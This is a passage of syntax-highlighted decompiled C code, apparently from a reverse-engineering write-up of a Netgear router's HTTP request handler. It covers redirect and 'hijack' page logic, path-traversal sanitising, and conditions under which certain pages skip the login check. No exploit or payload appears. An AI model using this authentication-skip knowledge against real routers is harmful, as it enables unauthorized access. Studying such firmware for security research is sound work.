class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    v79 = host;</span><br><span class="line">    v80 = nvram_get(<span class="string">&quot;lan_ipaddr&quot;</span>);</span><br><span class="line">    v81 = v79;</span><br><span class="line">    v72 = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(v81, v80) &amp;&amp; !<span class="built_in">strstr</span>(host, <span class="string">&quot;routerlogin&quot;</span>) )</span><br><span class="line">      v72 = v75;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v66 = inet_ntoa(in);</span><br><span class="line">    v67 = strdup(v66);</span><br><span class="line">    v68 = host;</span><br><span class="line">    v70 = v67;</span><br><span class="line">    v69 = nvram_get(<span class="string">&quot;lan_ipaddr&quot;</span>);</span><br><span class="line">    v71 = v68;</span><br><span class="line">    v72 = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(v71, v69) )</span><br><span class="line">    &#123;</span><br><span class="line">      v73 = host;</span><br><span class="line">      <span class="keyword">if</span> ( !<span class="built_in">strstr</span>(host, <span class="string">&quot;routerlogin&quot;</span>) )</span><br><span class="line">        v72 = <span class="built_in">strstr</span>(v73, v70) != <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  v82 = select_request_type(<span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span> ( strcasecmp(v14, v82) )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_203;</span><br><span class="line">  v83 = path;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strstr</span>(path, <span class="string">&quot;BRS_&quot;</span>)</span><br><span class="line">    || <span class="built_in">strstr</span>(v83, <span class="string">&quot;debug.htm&quot;</span>)</span><br><span class="line">    || <span class="built_in">strstr</span>(v83, <span class="string">&quot;currentsetting&quot;</span>)</span><br><span class="line">    || <span class="built_in">strstr</span>(v83, <span class="string">&quot;POT.htm&quot;</span>)</span><br><span class="line">    || !access(<span class="string">&quot;/tmp/wizard_vlan&quot;</span>, <span class="number">0</span>)</span><br><span class="line">    || !access(<span class="string">&quot;/tmp/conflict_warning&quot;</span>, <span class="number">0</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_203;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v72 &amp;&amp; !(need_fakepath)(path) )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_205;</span><br><span class="line">  <span class="keyword">if</span> ( access(<span class="string">&quot;/tmp/brs_gui_hijack&quot;</span>, <span class="number">0</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v72 )</span><br><span class="line">      v84 = <span class="string">&quot;BRS_index.htm&quot;</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      v84 = <span class="string">&quot;BRS_hijack_index.htm&quot;</span>;</span><br><span class="line">    <span class="built_in">sprintf</span>(temp_uri, <span class="string">&quot;/setup.cgi?next_file=%s HTTP/1.1&quot;</span>, v84);</span><br><span class="line">    path = temp_uri;</span><br><span class="line">LABEL_203:</span><br><span class="line">    <span class="keyword">if</span> ( !v72 )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_204;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_205;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !v72 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">sprintf</span>(temp_uri, <span class="string">&quot;/setup.cgi?next_file=%s HTTP/1.1&quot;</span>, <span class="string">&quot;BRS_hijack_success.htm&quot;</span>);</span><br><span class="line">    path = temp_uri;</span><br><span class="line">LABEL_204:</span><br><span class="line">    login_or_not = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_205:</span><br><span class="line">  v85 = nvram_get(<span class="string">&quot;config_state&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !v85 )</span><br><span class="line">    v85 = (<span class="string">&quot;\r\n\r\n&quot;</span> + <span class="number">4</span>);</span><br><span class="line">  <span class="keyword">if</span> ( *v85 == <span class="string">&#x27;b&#x27;</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_211;</span><br><span class="line">  v86 = nvram_get(<span class="string">&quot;need_not_login&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !v86 )</span><br><span class="line">    v86 = (<span class="string">&quot;\r\n\r\n&quot;</span> + <span class="number">4</span>);</span><br><span class="line">  <span class="keyword">if</span> ( *v86 == <span class="number">49</span> )</span><br><span class="line">  &#123;</span><br><span class="line">LABEL_211:</span><br><span class="line">    nvram_set(<span class="string">&quot;need_not_login&quot;</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">    nvram_set(<span class="string">&quot;start_in_blankstate&quot;</span>, <span class="string">&quot;1&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( (path_exist)(path, off_427E50, v14)</span><br><span class="line">    || (v87 = path, <span class="built_in">strstr</span>(path, <span class="string">&quot;htpwd_recovery.cgi&quot;</span>)) &amp;&amp; (v88 = select_request_type(<span class="number">3</span>), !strcasecmp(v14, v88))</span><br><span class="line">    || <span class="built_in">strstr</span>(v87, <span class="string">&quot;PNPX_GetShareFolderList&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    multi_login_flag = <span class="number">0</span>;</span><br><span class="line">    login_or_not = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strstr</span>(path, <span class="string">&quot;currentsetting.htm&quot;</span>) )</span><br><span class="line">      currentsetting_flag = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v89 = off_427E50;</span><br><span class="line">  v90 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( *v89 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strstr</span>(path, *v89) )</span><br><span class="line">      v90 = <span class="number">1</span>;</span><br><span class="line">    ++v89;</span><br><span class="line">  &#125;</span><br><span class="line">  v91 = nvram_get(<span class="string">&quot;openvpn_hijack&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !v91 )</span><br><span class="line">    v91 = (<span class="string">&quot;\r\n\r\n&quot;</span> + <span class="number">4</span>);</span><br><span class="line">  <span class="keyword">if</span> ( *v91 == <span class="number">49</span> &amp;&amp; !do_ssl )</span><br><span class="line">  &#123;</span><br><span class="line">    v92 = select_request_type(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !strcasecmp(v14, v92) &amp;&amp; !v90 )</span><br><span class="line">    &#123;</span><br><span class="line">      v93 = path;</span><br><span class="line">      <span class="keyword">if</span> ( !<span class="built_in">strstr</span>(path, <span class="string">&quot;.gif&quot;</span>)</span><br><span class="line">        &amp;&amp; !<span class="built_in">strstr</span>(v93, <span class="string">&quot;.css&quot;</span>)</span><br><span class="line">        &amp;&amp; !<span class="built_in">strstr</span>(v93, <span class="string">&quot;.js&quot;</span>)</span><br><span class="line">        &amp;&amp; !<span class="built_in">strstr</span>(v93, <span class="string">&quot;.xml&quot;</span>)</span><br><span class="line">        &amp;&amp; !<span class="built_in">strstr</span>(v93, <span class="string">&quot;.png&quot;</span>)</span><br><span class="line">        &amp;&amp; !<span class="built_in">strstr</span>(v93, <span class="string">&quot;.jpg&quot;</span>)</span><br><span class="line">        &amp;&amp; !currentsetting_flag )</span><br><span class="line">      &#123;</span><br><span class="line">        v94 = dword_429740;</span><br><span class="line">        <span class="keyword">if</span> ( !dword_429740 )</span><br><span class="line">          v94 = <span class="string">&quot;HTTP/1.1&quot;</span>;</span><br><span class="line">        dword_429740 = v94;</span><br><span class="line">        <span class="built_in">snprintf</span>(</span><br><span class="line">          v172,</span><br><span class="line">          <span class="number">0x64</span>u,</span><br><span class="line">          <span class="string">&quot;Location: http://www.routerlogin.net/setup.cgi?next_file=%s&quot;</span>,</span><br><span class="line">          <span class="string">&quot;openvpn_confirm_update.htm&quot;</span>);</span><br><span class="line">LABEL_255:</span><br><span class="line">        v20 = <span class="number">302</span>;</span><br><span class="line">        v21 = <span class="string">&quot;Found&quot;</span>;</span><br><span class="line">        v22 = v172;</span><br><span class="line">        v23 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_382;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  v95 = nvram_get(<span class="string">&quot;tc_from_old&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !v95 )</span><br><span class="line">    v95 = (<span class="string">&quot;\r\n\r\n&quot;</span> + <span class="number">4</span>);</span><br><span class="line">  <span class="keyword">if</span> ( *v95 == <span class="number">49</span> &amp;&amp; !do_ssl )</span><br><span class="line">  &#123;</span><br><span class="line">    v96 = select_request_type(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !strcasecmp(v14, v96) &amp;&amp; !v90 )</span><br><span class="line">    &#123;</span><br><span class="line">      v97 = path;</span><br><span class="line">      <span class="keyword">if</span> ( !<span class="built_in">strstr</span>(path, <span class="string">&quot;.gif&quot;</span>)</span><br><span class="line">        &amp;&amp; !<span class="built_in">strstr</span>(v97, <span class="string">&quot;.css&quot;</span>)</span><br><span class="line">        &amp;&amp; !<span class="built_in">strstr</span>(v97, <span class="string">&quot;.js&quot;</span>)</span><br><span class="line">        &amp;&amp; !<span class="built_in">strstr</span>(v97, <span class="string">&quot;.xml&quot;</span>)</span><br><span class="line">        &amp;&amp; !<span class="built_in">strstr</span>(v97, <span class="string">&quot;.png&quot;</span>)</span><br><span class="line">        &amp;&amp; !<span class="built_in">strstr</span>(v97, <span class="string">&quot;.jpg&quot;</span>)</span><br><span class="line">        &amp;&amp; !currentsetting_flag )</span><br><span class="line">      &#123;</span><br><span class="line">        v98 = dword_429740;</span><br><span class="line">        <span class="keyword">if</span> ( !dword_429740 )</span><br><span class="line">          v98 = <span class="string">&quot;HTTP/1.1&quot;</span>;</span><br><span class="line">        dword_429740 = v98;</span><br><span class="line">        <span class="built_in">snprintf</span>(v172, <span class="number">0x64</span>u, <span class="string">&quot;Location: %s&quot;</span>, <span class="string">&quot;tc_exist_unit_hijack.htm&quot;</span>);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_255;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  v99 = path;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strstr</span>(path, <span class="string">&quot;.cgi&quot;</span>) &amp;&amp; <span class="built_in">strstr</span>(v99, <span class="string">&quot;.htm&quot;</span>) &amp;&amp; !<span class="built_in">strstr</span>(v99, <span class="string">&quot;shares&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v100 = <span class="built_in">strlen</span>(v99);</span><br><span class="line">    <span class="keyword">if</span> ( v100 &gt;= <span class="number">0x1E2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v20 = <span class="number">404</span>;</span><br><span class="line">      v21 = <span class="string">&quot;Not Found&quot;</span>;</span><br><span class="line">      v22 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">      v23 = <span class="string">&quot;No such file.&quot;</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_382;</span><br><span class="line">    &#125;</span><br><span class="line">    strlcpy(temp_uri, v99, v100 - <span class="number">8</span>);</span><br><span class="line">    v101 = <span class="built_in">strrchr</span>(temp_uri, <span class="number">47</span>);</span><br><span class="line">    strlcpy(byte_429AA4, temp_uri, v101 - temp_uri);</span><br><span class="line">    v102 = path;</span><br><span class="line">    <span class="keyword">if</span> ( *path == <span class="string">&#x27;/&#x27;</span> )</span><br><span class="line">      path = v102 + <span class="built_in">strlen</span>(byte_429AA4) + <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">snprintf</span>(temp_uri, <span class="number">0x200</span>u, <span class="string">&quot;%s/setup.cgi?next_file=%s&quot;</span>, byte_429AA4, path);</span><br><span class="line">    path = temp_uri;</span><br><span class="line">  &#125;</span><br><span class="line">  v103 = path;</span><br><span class="line">  path = v103 + <span class="built_in">strspn</span>(path, <span class="string">&quot; \t\n\r&quot;</span>);</span><br><span class="line">  v104 = <span class="built_in">strpbrk</span>(path, <span class="string">&quot; \t\n\r&quot;</span>);</span><br><span class="line">  dword_429740 = v104;</span><br><span class="line">  <span class="keyword">if</span> ( !v104 )</span><br><span class="line">  &#123;</span><br><span class="line">    v20 = <span class="number">400</span>;</span><br><span class="line">    v21 = <span class="string">&quot;Bad Request&quot;</span>;</span><br><span class="line">    v22 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_266;</span><br><span class="line">  &#125;</span><br><span class="line">  *v104 = <span class="number">0</span>;</span><br><span class="line">  dword_429740 = (v104 + <span class="number">1</span>);</span><br><span class="line">  v105 = <span class="built_in">strchr</span>(path, <span class="string">&#x27;?&#x27;</span>);</span><br><span class="line">  dword_42973C = v105;</span><br><span class="line">  <span class="keyword">if</span> ( v105 )</span><br><span class="line">  &#123;</span><br><span class="line">    *v105 = <span class="number">0</span>;</span><br><span class="line">    v106 = v105 + <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v106 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  dword_42973C = v106;</span><br><span class="line">  v107 = select_request_type(<span class="number">1</span>);</span><br><span class="line">  v108 = strcasecmp(v14, v107) == <span class="number">0</span>;</span><br><span class="line">  v109 = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !v108 )</span><br><span class="line">  &#123;</span><br><span class="line">    v110 = select_request_type(<span class="number">2</span>);</span><br><span class="line">    v108 = strcasecmp(v14, v110) == <span class="number">0</span>;</span><br><span class="line">    v109 = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !v108 )</span><br><span class="line">    &#123;</span><br><span class="line">      v111 = select_request_type(<span class="number">3</span>);</span><br><span class="line">      v108 = strcasecmp(v14, v111) != <span class="number">0</span>;</span><br><span class="line">      v109 = <span class="number">3</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v108 )</span><br><span class="line">      &#123;</span><br><span class="line">        v20 = <span class="number">501</span>;</span><br><span class="line">        v21 = <span class="string">&quot;Not Implemented&quot;</span>;</span><br><span class="line">        v22 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        v23 = <span class="string">&quot;That method is not implemented.&quot;</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_382;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  v112 = path;</span><br><span class="line">  dword_429730 = v109;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strstr</span>(path, <span class="string">&quot;%00&quot;</span>) || (sub_4062BC(v112, v112), v113 = path, *path != <span class="number">47</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v20 = <span class="number">400</span>;</span><br><span class="line">    v21 = <span class="string">&quot;Bad Request&quot;</span>;</span><br><span class="line">    v22 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    v23 = <span class="string">&quot;Bad filename.&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_382;</span><br><span class="line">  &#125;</span><br><span class="line">  v114 = path + <span class="number">1</span>;</span><br><span class="line">  dword_429734 = (path + <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v117 = <span class="built_in">strstr</span>(v113 + <span class="number">1</span>, <span class="string">&quot;//&quot;</span>);</span><br><span class="line">    v118 = v117;</span><br><span class="line">    <span class="keyword">if</span> ( !v117 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">for</span> ( j = v117 + <span class="number">2</span>; *j == <span class="number">47</span>; ++j )</span><br><span class="line">      ;</span><br><span class="line">    HIDWORD(v182) = j;</span><br><span class="line">    v116 = <span class="built_in">strlen</span>(j);</span><br><span class="line">    memmove(v118 + <span class="number">1</span>, HIDWORD(v182), v116 + <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( !<span class="built_in">strncmp</span>(v113 + <span class="number">1</span>, <span class="string">&quot;./&quot;</span>, <span class="number">2u</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v119 = <span class="built_in">strlen</span>(v113 + <span class="number">3</span>);</span><br><span class="line">    memmove((v113 + <span class="number">1</span>), v113 + <span class="number">3</span>, v119 + <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v121 = <span class="built_in">strstr</span>(v113 + <span class="number">1</span>, <span class="string">&quot;/./&quot;</span>);</span><br><span class="line">    v122 = v121;</span><br><span class="line">    <span class="keyword">if</span> ( !v121 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    HIDWORD(v182) = v121 + <span class="number">2</span>;</span><br><span class="line">    v120 = <span class="built_in">strlen</span>(v121 + <span class="number">2</span>);</span><br><span class="line">    memmove(v122, HIDWORD(v182), v120 + <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(v113 + <span class="number">1</span>, <span class="string">&quot;../&quot;</span>, <span class="number">3u</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v123 = <span class="built_in">strlen</span>(v113 + <span class="number">4</span>);</span><br><span class="line">      v124 = (v113 + <span class="number">1</span>);</span><br><span class="line">      v125 = v113 + <span class="number">4</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_299;</span><br><span class="line">    &#125;</span><br><span class="line">    v126 = <span class="built_in">strstr</span>(v113 + <span class="number">1</span>, <span class="string">&quot;/../&quot;</span>);</span><br><span class="line">    v127 = v126 - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !v126 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">for</span> ( k = v127 &lt; v114; !k &amp;&amp; *v127 != <span class="number">47</span>; k = v127 &lt; v114 )</span><br><span class="line">      --v127;</span><br><span class="line">    LODWORD(v182) = v127;</span><br><span class="line">    HIDWORD(v182) = v126 + <span class="number">4</span>;</span><br><span class="line">    v123 = <span class="built_in">strlen</span>(v126 + <span class="number">4</span>);</span><br><span class="line">    v125 = HIDWORD(v182);</span><br><span class="line">    v124 = (v182 + <span class="number">1</span>);</span><br><span class="line">LABEL_299:</span><br><span class="line">    memmove(v124, v125, v123 + <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_304:</span><br><span class="line">  v130 = <span class="built_in">strlen</span>(v113 + <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v130 &gt;= <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v129 = (v114 + v130 - <span class="number">3</span> - <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>((v114 + v130 - <span class="number">3</span>), <span class="string">&quot;/..&quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( v129 &gt;= v114 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( *v129 == <span class="number">47</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          *v129 = <span class="number">0</span>;</span><br><span class="line">          <span class="keyword">goto</span> LABEL_304;</span><br><span class="line">        &#125;</span><br><span class="line">        --v129;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !v113[<span class="number">1</span>] )</span><br><span class="line">    dword_429734 = <span class="string">&quot;./&quot;</span>;</span><br><span class="line">  v131 = dword_429734;</span><br><span class="line">  v132 = *dword_429734;</span><br><span class="line">  <span class="keyword">if</span> ( v132 == <span class="string">&#x27;/&#x27;</span> || v132 == <span class="string">&#x27;.&#x27;</span> &amp;&amp; dword_429734[<span class="number">1</span>] == <span class="string">&#x27;.&#x27;</span> &amp;&amp; (!dword_429734[<span class="number">2</span>] || dword_429734[<span class="number">2</span>] == <span class="string">&#x27;/&#x27;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v20 = <span class="number">400</span>;</span><br><span class="line">    v21 = <span class="string">&quot;Bad Request&quot;</span>;</span><br><span class="line">    v22 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    v23 = <span class="string">&quot;Illegal filename.&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_382;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( dword_4284D4 )</span><br><span class="line">  &#123;</span><br><span class="line">    v133 = host;</span><br><span class="line">    <span class="keyword">if</span> ( !host )</span><br><span class="line">    &#123;</span><br><span class="line">      v169 = <span class="number">128</span>;</span><br><span class="line">      <span class="keyword">if</span> ( getsockname(fd, v177, &amp;v169) &gt;= <span class="number">0</span> )</span><br><span class="line">        v133 = ntoa(v177);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        v133 = <span class="string">&quot;UNKNOWN_HOST&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    dword_429750 = v133;</span><br><span class="line">    v134 = v133;</span><br><span class="line">    <span class="keyword">for</span> ( l = dword_429750; ; ++l )</span><br><span class="line">    &#123;</span><br><span class="line">      v136 = *l;</span><br><span class="line">      v108 = v136 != <span class="number">0</span>;</span><br><span class="line">      v137 = <span class="number">2</span> * v136;</span><br><span class="line">      <span class="keyword">if</span> ( !v108 )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">if</span> ( (*(_ctype_b + v137) &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">        *l = *(_ctype_tolower + v137);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">snprintf</span>(byte_429CA4, <span class="number">0x2710</span>u, <span class="string">&quot;%s/%s&quot;</span>, v134, v131);</span><br><span class="line">    dword_429734 = byte_429CA4;</span><br><span class="line">  &#125;</span><br><span class="line">  signal(<span class="number">14</span>, sub_407E44);</span><br><span class="line">  alarm(<span class="number">0x12C</span>u);</span><br><span class="line">  v170 = stat64(dword_429734, &amp;sb);</span><br><span class="line">  <span class="keyword">if</span> ( v170 &lt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v138 = dword_429734;</span><br><span class="line">    <span class="keyword">for</span> ( dword_429738 = &amp;v138[<span class="built_in">strlen</span>(dword_429734)]; ; *dword_429738 = <span class="number">47</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v139 = dword_429734;</span><br><span class="line">      v140 = dword_429738;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( dword_429734 &gt;= --v140 )</span><br><span class="line">        &#123;</span><br><span class="line">          dword_429738 = <span class="number">0</span>;</span><br><span class="line">          v141 = <span class="number">-1</span>;</span><br><span class="line">          <span class="keyword">goto</span> LABEL_334;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( *v140 != <span class="number">47</span> );</span><br><span class="line">      dword_429738 = v140;</span><br><span class="line">      *v140 = <span class="number">0</span>;</span><br><span class="line">      v141 = stat64(v139, &amp;sb);</span><br><span class="line">      <span class="keyword">if</span> ( v141 &gt;= <span class="number">0</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ++dword_429738;</span><br><span class="line">LABEL_334:</span><br><span class="line">    v170 = v141;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v170 &lt; <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_371;</span><br><span class="line">  <span class="keyword">if</span> ( (!::haystack || !*::haystack) &amp;&amp; dword_429734 )</span><br><span class="line">  &#123;</span><br><span class="line">    v172[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    v172[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    v172[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">    v172[<span class="number">3</span>] = <span class="number">0</span>;</span><br><span class="line">    v172[<span class="number">4</span>] = <span class="number">0</span>;</span><br><span class="line">    in.s_addr = <span class="number">0</span>;</span><br><span class="line">    v142 = nvram_get(<span class="string">&quot;product_name&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !v142 )</span><br><span class="line">      v142 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="built_in">sprintf</span>(v172, <span class="string">&quot;NETGEAR_%s.cfg&quot;</span>, v142);</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(dword_429734, v172) )</span><br><span class="line">    &#123;</span><br><span class="line">      v20 = <span class="number">403</span>;</span><br><span class="line">      v21 = <span class="string">&quot;Forbidden&quot;</span>;</span><br><span class="line">      v22 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">      v23 = <span class="string">&quot;HTML is illegal.&quot;</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_382;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  v143 = dword_429734;</span><br><span class="line">  v144 = &amp;v143[<span class="built_in">strlen</span>(dword_429734)];</span><br><span class="line">  <span class="keyword">if</span> ( (dword_432B40 &amp; <span class="number">0xF000</span>) == <span class="number">0x4000</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *(v144 - <span class="number">1</span>) == <span class="number">47</span> || dword_429738 )</span><br><span class="line">    &#123;</span><br><span class="line">      v146 = maybe_allow_uris;</span><br><span class="line">      <span class="keyword">while</span> ( v146 != v172 )</span><br><span class="line">      &#123;</span><br><span class="line">        LODWORD(v182) = dword_429734;</span><br><span class="line">        <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(dword_429734, <span class="string">&quot;./&quot;</span>) )</span><br><span class="line">          <span class="built_in">snprintf</span>(v178, <span class="number">0x2710</span>u, <span class="string">&quot;%s&quot;</span>, *v146);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          <span class="built_in">snprintf</span>(v178, <span class="number">0x2710</span>u, <span class="string">&quot;%s%s&quot;</span>, v182, *v146);</span><br><span class="line">        <span class="keyword">if</span> ( is_usb_session )</span><br><span class="line">        &#123;</span><br><span class="line">          ++v146;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          ++v146;</span><br><span class="line">          <span class="keyword">if</span> ( stat64(v178, &amp;sb) &gt;= <span class="number">0</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            dword_429734 = v178;</span><br><span class="line">            <span class="keyword">goto</span> LABEL_361;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      v147 = access(<span class="string">&quot;/tmp/http_disable_lan&quot;</span>, <span class="number">0</span>);</span><br><span class="line">      v149 = <span class="number">0x410000</span>;</span><br><span class="line">      <span class="keyword">if</span> ( !v147 )</span><br><span class="line">      &#123;</span><br><span class="line">        v150 = nvram_get(<span class="string">&quot;lan_ipaddr&quot;</span>);</span><br><span class="line">        v152 = inet_network(v150);</span><br><span class="line">        v151 = nvram_get(<span class="string">&quot;lan_netmask&quot;</span>);</span><br><span class="line">        v154 = inet_network(v151);</span><br><span class="line">        v153 = inet_network(remote_ip);</span><br><span class="line">        v148 = <span class="number">0x410000</span>;</span><br><span class="line">        <span class="keyword">if</span> ( ((v153 ^ v152) &amp; v154) == <span class="number">0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v20 = <span class="number">503</span>;</span><br><span class="line">          v21 = <span class="string">&quot;The Share is not available&quot;</span>;</span><br><span class="line">LABEL_369:</span><br><span class="line">          v22 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">          v23 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">          <span class="keyword">goto</span> LABEL_382;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( !sc_usb_mounted(v149, v148) )</span><br><span class="line">      &#123;</span><br><span class="line">        v20 = <span class="number">503</span>;</span><br><span class="line">        v21 = <span class="string">&quot;No Shares Available&quot;</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_369;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( dword_429738 )</span><br><span class="line">      &#123;</span><br><span class="line">LABEL_371:</span><br><span class="line">        v20 = <span class="number">404</span>;</span><br><span class="line">        v21 = <span class="string">&quot;Not Found&quot;</span>;</span><br><span class="line">        v22 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_372;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( is_usb_session )</span><br><span class="line">        usb_auth_check(dword_429734);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        maybe_login(dword_429734);</span><br><span class="line">      sub_407980();</span><br><span class="line">      <span class="keyword">if</span> ( !is_usb_session || is_readable(dword_429734, <span 